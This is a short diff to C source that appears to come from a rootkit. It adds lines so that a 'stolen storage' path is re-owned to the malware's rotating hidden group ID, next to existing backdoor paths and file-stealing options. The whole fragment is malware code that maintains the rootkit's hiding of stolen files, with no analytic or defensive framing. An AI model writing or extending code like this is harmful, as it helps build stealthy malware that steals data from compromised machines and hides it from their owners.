@@ -74,6 +74,9 @@ gid_t changerkgid(int curtime){
     for(int i = 0; i < BDVPATHS_SIZE; i++)
         chown_path(bdvpaths[i], newgid);
 
+#ifdef STOLEN_STORAGE
+    chown_path(STOLESTORE_PATH, newgid);
+#endif
 #if defined FILE_STEAL && defined FILE_CLEANSE_TIMER
     chown_path(CLEANEDTIME_PATH, newgid);
 #endif
